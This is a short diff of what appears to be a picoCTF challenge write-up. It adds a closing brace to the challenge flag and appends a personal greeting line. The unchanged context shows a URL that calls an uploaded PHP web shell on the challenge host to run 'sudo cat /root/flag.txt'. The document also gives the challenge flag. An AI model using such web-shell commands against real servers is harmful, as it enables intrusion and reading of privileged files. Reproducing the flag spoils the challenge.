@@ -37,5 +37,7 @@ Using scripts you can check the permissions of the user and can find out that th
 The following url will lead to the final ctf as the root user:
 http://standard-pizzas.picoctf.net:63914/uploads/shell.php?cmd=sudo cat /root/flag.txt
 
-The flag is: picoCTF{wh47_c4n_u_d0_wPHP_f7424fc7
+The flag is: picoCTF{wh47_c4n_u_d0_wPHP_f7424fc7}
+
+Hello it Kevin :D
 
